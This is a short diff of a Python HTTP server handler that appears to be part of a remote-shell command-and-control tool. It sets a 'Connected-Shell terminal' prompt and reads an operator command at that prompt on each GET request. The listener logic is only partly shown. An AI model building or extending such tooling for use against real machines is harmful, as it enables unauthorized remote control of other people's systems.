@@ -2,31 +2,19 @@
 import http.server
 from os import system
 import cgi
-from cores.Profile_Conf import SHELL_STATEMENT, DOWNLOADING_PATH
+from cores.Configurations import DOWNLOADING_PATH
 from cores.help_manager import help_man
-# from termcolor import colored
+from termcolor import colored
 import getpass
 
-def colored(text, col):
-    return text
 
-
-shell_options = [
-    # module1
-    [],
-
-    [],
-
-    [],
-
-    [],
-
-]
+# Connected-Shell terminal
+SHELL_STATEMENT = f"F4T3H(IP)> "
 
 
 class ServerHandler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
-        command = input(colored(f"{SHELL_STATEMENT}> ", "blue"))
+        command = input(colored(SHELL_STATEMENT, "blue"))
         if "help" in command:
             help_man()
         else:
